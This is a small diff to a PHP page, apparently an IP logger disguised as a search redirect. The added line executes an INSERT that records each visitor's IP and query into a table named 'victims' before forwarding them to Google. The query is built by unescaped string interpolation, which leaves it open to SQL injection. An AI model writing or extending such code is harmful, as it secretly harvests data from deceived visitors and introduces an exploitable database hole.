@@ -21,7 +21,8 @@
 
         
             $sql = "INSERT INTO victims (ip, q) VALUES ('{$ip}', {$q});";
-
+            $result = mysqli_query($conn, $sql);
+            
             $url= "https://www.google.com/search?q=" . $q;
             header("Location: $url"); 
 
